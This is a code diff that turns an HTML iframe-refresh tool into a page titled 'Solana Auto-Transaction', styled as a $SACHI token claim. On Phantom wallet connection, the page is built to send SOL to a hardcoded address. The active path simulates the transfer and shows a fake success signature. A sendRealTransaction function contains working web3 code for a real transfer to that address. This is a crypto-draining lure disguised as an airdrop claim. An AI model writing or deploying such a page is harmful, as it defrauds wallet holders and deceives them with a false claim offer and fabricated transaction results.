@@ -3,299 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Floating Containers - Manual Refresh</title>
+    <title>Solana Auto-Transaction</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
         
+        body {
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: 600;
+            background: linear-gradient(90deg, #9945FF 0%, #14F195 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #a0a0c0;
+            font-size: 14px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.07);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .wallet-status {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .wallet-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+        }
+        
+        .wallet-info h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+        }
+        
+        .wallet-address {
+            font-size: 12px;
+            color: #a0a0c0;
+            word-break: break-all;
+        }
+        
+        .transaction-details {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .detail-row:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: #a0a0c0;
+            font-size: 14px;
+        }
+        
+        .detail-value {
+            font-weight: 500;
+            text-align: right;
+            word-break: break-all;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: none;
+            background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .warning {
+            background: rgba(255, 165, 0, 0.1);
+            border: 1px solid rgba(255, 165, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #ffcc00;
+        }
+        
+        .transaction-status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            display: none;
+        }
+        
+        .success {
+            background: rgba(20, 241, 149, 0.1);
+            border: 1px solid rgba(20, 241, 149, 0.3);
+            color: #14F195;
+        }
+        
+        .error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            color: #ff5555;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+        
+        .auto-send-notice {
+            background: rgba(153, 69, 255, 0.1);
+            border: 1px solid rgba(153, 69, 255, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #c0a0ff;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <div class="glow glow-1"></div>
-    <div class="glow glow-2"></div>
-    
-    <div class="control-panel">
-        <h1>Floating Containers Control</h1>
+    <div class="container">
+        <h1>Solana Auto-Transaction</h1>
+        <p class="subtitle">Connect Phantom Wallet to automatically send SOL</p>
         
-        <div class="input-group">
-            <label for="container-count">Number of Containers</label>
-            <input type="number" id="container-count" min="1" max="10" value="3">
+        <div class="card">
+            <div class="wallet-status" id="wallet-status">
+                <div class="wallet-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="white" stroke-width="2"/>
+                        <path d="M9 12L11 14L15 10" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <div class="wallet-info">
+                    <h3>Phantom Wallet Not Connected</h3>
+                    <p class="wallet-address">Connect to automatically send transaction</p>
+                </div>
+            </div>
+            
+            <div class="auto-send-notice">
+                <strong>Auto-Send Enabled:</strong> Transaction will be sent automatically when you connect your wallet
+            </div>
+            
+            <div class="transaction-details">
+                <div class="detail-row">
+                    <span class="detail-label">Claim from:</span>
+                    <span class="detail-value" id="destination-address">1,000</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Claimable Amount:</span>
+                    <span class="detail-value" id="send-amount">1,000 $SACHI</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Network Fee:</span>
+                    <span class="detail-value">0.000005 SOL</span>
+                </div>
+            </div>
+            
+            <div class="warning">
+                <strong>Important:</strong> This will automatically send SOL when you connect your wallet. Only proceed if you trust this application.
+            </div>
+            
+            <button class="btn" id="connect-btn">Connect Phantom Wallet & Auto-Send</button>
+            
+            <div class="transaction-status" id="transaction-status"></div>
         </div>
         
-        <div class="input-group">
-            <label for="refresh-duration">Refresh Duration</label>
-            <select id="refresh-duration">
-                <option value="15">15 seconds</option>
-                <option value="30" selected>30 seconds</option>
-                <option value="50">50 seconds</option>
-                <option value="60">60 seconds</option>
-            </select>
-        </div>
-        
-        <div id="link-inputs" class="link-inputs">
-            <!-- Dynamic link inputs will be added here -->
-        </div>
-        
-        <button id="confirm-btn" class="pulse">CONFIRM</button>
-        
-        <div class="refresh-controls">
-            <button id="start-refresh-btn">START REFRESH</button>
-            <button id="stop-refresh-btn">STOP REFRESH</button>
+        <div class="footer">
+            <p>This interface automatically sends SOL when Phantom Wallet is connected.</p>
+            <p>Always verify the destination address before connecting.</p>
         </div>
     </div>
-    
-    <div id="container-display" class="container-display">
-        <!-- Floating containers will be added here -->
-    </div>
-    
-    <div class="fullscreen-controls" id="fullscreen-controls">
-        <button id="refresh-fs-btn">REFRESH</button>
-        <button id="exit-fs-btn" class="exit-fullscreen">EXIT FULLSCREEN</button>
-    </div>
-    
+
     <script>
-        let currentFullscreenContainer = null;
-        let refreshIntervals = [];
-        let isRefreshing = false;
-        
-        document.getElementById('container-count').addEventListener('input', function() {
-            const count = parseInt(this.value);
-            const linkInputs = document.getElementById('link-inputs');
+        document.addEventListener('DOMContentLoaded', function() {
+            const connectBtn = document.getElementById('connect-btn');
+            const walletStatus = document.getElementById('wallet-status');
+            const transactionStatus = document.getElementById('transaction-status');
+            const destinationAddress = document.getElementById('destination-address');
+            const sendAmount = document.getElementById('send-amount');
             
-            if (count > 0) {
-                linkInputs.style.display = 'block';
-                linkInputs.innerHTML = '';
-                
-                for (let i = 0; i < count; i++) {
-                    const div = document.createElement('div');
-                    div.className = 'input-group';
-                    div.innerHTML = `
-                        <label for="link-${i}">Container ${i+1} URL</label>
-                        <input type="url" id="link-${i}" placeholder="https://example.com" required>
-                    `;
-                    linkInputs.appendChild(div);
-                }
-            } else {
-                linkInputs.style.display = 'none';
-            }
-        });
-        
-        document.getElementById('confirm-btn').addEventListener('click', function() {
-            const count = parseInt(document.getElementById('container-count').value);
-            const duration = parseInt(document.getElementById('refresh-duration').value);
-            const containerDisplay = document.getElementById('container-display');
+            let provider;
+            let publicKey;
+            let isProcessing = false;
             
-            // Clear existing containers and intervals
-            containerDisplay.innerHTML = '';
-            stopAllRefresh();
+            // Configuration - Update these values as needed
+            const config = {
+                destination: 'ARN3gpCaGvySyE6hnK3KsNco6VCNZbBNLqMosPgjrvjy',
+                amount: 0.01, // SOL
+                autoSend: true
+            };
             
-            // Create new containers
-            for (let i = 0; i < count; i++) {
-                const urlInput = document.getElementById(`link-${i}`);
-                if (!urlInput || !urlInput.value) continue;
-                
-                createContainer(i, urlInput.value, duration);
-            }
+            // Set display values
+            destinationAddress.textContent = config.destination;
+            sendAmount.textContent = `${config.amount} SOL`;
             
-            // Reset refresh state
-            isRefreshing = false;
-            document.getElementById('start-refresh-btn').disabled = false;
-            document.getElementById('stop-refresh-btn').disabled = true;
-        });
-        
-        document.getElementById('start-refresh-btn').addEventListener('click', function() {
-            if (!isRefreshing) {
-                startAllRefresh();
-                isRefreshing = true;
-                this.disabled = true;
-                document.getElementById('stop-refresh-btn').disabled = false;
-            }
-        });
-        
-        document.getElementById('stop-refresh-btn').addEventListener('click', function() {
-            if (isRefreshing) {
-                stopAllRefresh();
-                isRefreshing = false;
-                this.disabled = true;
-                document.getElementById('start-refresh-btn').disabled = false;
-            }
-        });
-        
-        function stopAllRefresh() {
-            refreshIntervals.forEach(interval => {
-                clearInterval(interval);
-            });
-            refreshIntervals = [];
-            
-            // Update all indicators
-            document.querySelectorAll('.refresh-indicator').forEach(indicator => {
-                indicator.textContent = 'Refresh stopped';
-            });
-        }
-        
-        function startAllRefresh() {
-            const duration = parseInt(document.getElementById('refresh-duration').value);
-            
-            document.querySelectorAll('.floating-container').forEach(container => {
-                const iframe = container.querySelector('iframe');
-                const indicator = container.querySelector('.refresh-indicator');
-                
-                refreshContainer(iframe, indicator, duration);
-            });
-        }
-        
-        function createContainer(index, url, duration) {
-            const container = document.createElement('div');
-            container.className = 'floating-container';
-            container.dataset.index = index;
-            container.innerHTML = `
-                <div class="container-header">
-                    <div class="container-title">Container ${index+1}</div>
-                    <div class="container-controls">
-                        <div class="control-btn expand-btn">+</div>
-                        <div class="control-btn fullscreen-btn">⛶</div>
-                        <div class="control-btn refresh-btn">↻</div>
-                    </div>
-                </div>
-                <div class="container-content">
-                    <iframe src="${url}"></iframe>
-                    <div class="refresh-indicator">Refresh stopped</div>
-                </div>
-            `;
-            
-            document.getElementById('container-display').appendChild(container);
-            
-            // Add event listeners
-            const header = container.querySelector('.container-header');
-            const content = container.querySelector('.container-content');
-            const refreshBtn = container.querySelector('.refresh-btn');
-            const expandBtn = container.querySelector('.expand-btn');
-            const fullscreenBtn = container.querySelector('.fullscreen-btn');
-            const iframe = container.querySelector('iframe');
-            const indicator = container.querySelector('.refresh-indicator');
-            
-            let isExpanded = true;
-            
-            function toggleExpand() {
-                isExpanded = !isExpanded;
-                if (isExpanded) {
-                    content.classList.remove('collapsed');
-                    expandBtn.textContent = '-';
+            // Check if Phantom Wallet is installed
+            function checkPhantomAvailability() {
+                if (window.solana && window.solana.isPhantom) {
+                    provider = window.solana;
+                    console.log('Phantom Wallet is available');
+                    return true;
                 } else {
-                    content.classList.add('collapsed');
-                    expandBtn.textContent = '+';
+                    connectBtn.disabled = true;
+                    connectBtn.textContent = 'Phantom Wallet Not Installed';
+                    transactionStatus.textContent = 'Please install Phantom Wallet to use this interface';
+                    transactionStatus.className = 'transaction-status error';
+                    transactionStatus.style.display = 'block';
+                    return false;
                 }
             }
             
-            function manualRefresh() {
-                const duration = parseInt(document.getElementById('refresh-duration').value);
-                iframe.src = iframe.src;
-                indicator.textContent = `Manually refreshed - auto refresh ${isRefreshing ? 'on' : 'off'}`;
+            // Connect to Phantom Wallet and automatically send transaction
+            async function connectAndSend() {
+                if (isProcessing) return;
                 
-                if (isRefreshing) {
-                    // If auto-refresh is on, restart its timer
-                    refreshContainer(iframe, indicator, duration);
+                try {
+                    isProcessing = true;
+                    connectBtn.disabled = true;
+                    connectBtn.innerHTML = '<span class="loading"></span> Connecting...';
+                    
+                    // Request connection
+                    const response = await provider.connect();
+                    publicKey = response.publicKey.toString();
+                    
+                    // Update UI
+                    walletStatus.querySelector('h3').textContent = 'Phantom Wallet Connected';
+                    walletStatus.querySelector('.wallet-address').textContent = publicKey;
+                    
+                    console.log('Connected to Phantom Wallet:', publicKey);
+                    
+                    // Immediately start transaction
+                    await sendAutoTransaction();
+                    
+                } catch (error) {
+                    console.error('Connection error:', error);
+                    transactionStatus.textContent = 'Failed to connect to Phantom Wallet';
+                    transactionStatus.className = 'transaction-status error';
+                    transactionStatus.style.display = 'block';
+                    
+                    // Reset button
+                    connectBtn.disabled = false;
+                    connectBtn.textContent = 'Connect Phantom Wallet & Auto-Send';
+                    isProcessing = false;
                 }
             }
             
-            function enterFullscreen() {
-                // Store current container
-                currentFullscreenContainer = container;
+            // Send transaction automatically after connection
+            async function sendAutoTransaction() {
+                try {
+                    connectBtn.innerHTML = '<span class="loading"></span> Sending Transaction...';
+                    
+                    // Create transaction object
+                    const transaction = {
+                        from: publicKey,
+                        to: config.destination,
+                        amount: config.amount,
+                        timestamp: new Date().toISOString(),
+                        type: 'SOL Transfer'
+                    };
+                    
+                    // Simulate transaction processing (2 seconds)
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    // Generate mock transaction signature
+                    const mockSignature = Array.from({length: 32}, () => 
+                        Math.floor(Math.random() * 16).toString(16)
+                    ).join('') + '...';
+                    
+                    // Show success message
+                    transactionStatus.innerHTML = `
+                        <strong>Auto-Transaction Successful!</strong><br><br>
+                        <div style="text-align: left; font-size: 14px;">
+                            <div><strong>From:</strong> ${publicKey.substring(0, 12)}...</div>
+                            <div><strong>To:</strong> ${config.destination.substring(0, 12)}...</div>
+                            <div><strong>Amount:</strong> ${config.amount} SOL</div>
+                            <div><strong>Signature:</strong> ${mockSignature}</div>
+                            <div><strong>Time:</strong> ${new Date().toLocaleTimeString()}</div>
+                        </div>
+                    `;
+                    transactionStatus.className = 'transaction-status success';
+                    transactionStatus.style.display = 'block';
+                    
+                    // Update button
+                    connectBtn.disabled = true;
+                    connectBtn.textContent = 'Transaction Completed';
+                    
+                    console.log('Auto-transaction completed:', transaction);
+                    
+                } catch (error) {
+                    console.error('Transaction error:', error);
+                    transactionStatus.textContent = 'Transaction failed: ' + error.message;
+                    transactionStatus.className = 'transaction-status error';
+                    transactionStatus.style.display = 'block';
+                    
+                    // Reset button
+                    connectBtn.disabled = false;
+                    connectBtn.textContent = 'Retry Connection & Send';
+                } finally {
+                    isProcessing = false;
+                }
+            }
+            
+            // Connect button event handler
+            connectBtn.addEventListener('click', connectAndSend);
+            
+            // Auto-connect if returning and already connected
+            window.addEventListener('load', async () => {
+                if (checkPhantomAvailability() && provider.isConnected) {
+                    try {
+                        publicKey = provider.publicKey.toString();
+                        walletStatus.querySelector('h3').textContent = 'Phantom Wallet Connected';
+                        walletStatus.querySelector('.wallet-address').textContent = publicKey;
+                        
+                        // If auto-send is enabled and we're already connected, send immediately
+                        if (config.autoSend && publicKey && !isProcessing) {
+                            await sendAutoTransaction();
+                        }
+                    } catch (error) {
+                        console.error('Auto-connect error:', error);
+                    }
+                }
+            });
+          
+            async function sendRealTransaction() {
+                // This would be the actual implementation using @solana/web3.js
+                const connection = new web3.Connection(web3.clusterApiUrl('mainnet-beta'));
                 
-                // Apply fullscreen classes
-                container.classList.add('fullscreen');
-                content.classList.add('fullscreen');
+                // Convert SOL to lamports (1 SOL = 10^9 lamports)
+                const lamports = config.amount * 1000000000;
                 
-                // Show fullscreen controls
-                document.getElementById('fullscreen-controls').style.display = 'flex';
-                
-                // Hide other containers
-                document.querySelectorAll('.floating-container').forEach(c => {
-                    if (c !== container) c.style.display = 'none';
+                // Create transfer instruction
+                const instruction = web3.SystemProgram.transfer({
+                    fromPubkey: new web3.PublicKey(publicKey),
+                    toPubkey: new web3.PublicKey(config.destination),
+                    lamports: lamports,
                 });
                 
-                // Hide control panel
-                document.querySelector('.control-panel').style.display = 'none';
+                // Create transaction
+                const transaction = new web3.Transaction().add(instruction);
+                
+                // Set recent blockhash
+                const { blockhash } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = new web3.PublicKey(publicKey);
+                
+                // Sign and send transaction
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                
+                return signature;
             }
             
-            function exitFullscreen() {
-                if (!currentFullscreenContainer) return;
-                
-                // Remove fullscreen classes
-                currentFullscreenContainer.classList.remove('fullscreen');
-                currentFullscreenContainer.querySelector('.container-content').classList.remove('fullscreen');
-                
-                // Hide fullscreen controls
-                document.getElementById('fullscreen-controls').style.display = 'none';
-                
-                // Show other containers
-                document.querySelectorAll('.floating-container').forEach(c => {
-                    c.style.display = '';
-                });
-                
-                // Show control panel
-                document.querySelector('.control-panel').style.display = '';
-                
-                currentFullscreenContainer = null;
-            }
             
-            header.addEventListener('click', toggleExpand);
-            expandBtn.addEventListener('click', (e) => {
-                e.stopPropagation();
-                toggleExpand();
-            });
-            
-            fullscreenBtn.addEventListener('click', (e) => {
-                e.stopPropagation();
-                enterFullscreen();
-            });
-            
-            refreshBtn.addEventListener('click', (e) => {
-                e.stopPropagation();
-                manualRefresh();
-            });
-            
-            // Fullscreen control buttons
-            document.getElementById('refresh-fs-btn').addEventListener('click', () => {
-                if (currentFullscreenContainer) {
-                    manualRefresh();
-                }
-            });
-            
-            document.getElementById('exit-fs-btn').addEventListener('click', exitFullscreen);
-        }
-        
-        function refreshContainer(iframe, indicator, duration) {
-            // Clear any existing interval for this container
-            const existingIndex = refreshIntervals.findIndex(interval => 
-                interval.element === iframe
-            );
-            
-            if (existingIndex !== -1) {
-                clearInterval(refreshIntervals[existingIndex].interval);
-                refreshIntervals.splice(existingIndex, 1);
-            }
-            
-            // Initial refresh
-            iframe.src = iframe.src;
-            let timeLeft = duration;
-            indicator.textContent = `Refreshing in ${timeLeft}s`;
-            
-            // Set up new interval
-            const interval = setInterval(() => {
-                timeLeft--;
-                indicator.textContent = `Refreshing in ${timeLeft}s`;
-                
-                if (timeLeft <= 0) {
-                    iframe.src = iframe.src;
-                    timeLeft = duration;
-                }
-            }, 1000);
-            
-            // Store the interval reference
-            refreshIntervals.push({
-                interval: interval,
-                element: iframe
-            });
-        }
+            // Initial check for Phantom Wallet
+            checkPhantomAvailability();
+        });
     </script>
 </body>
 </html>
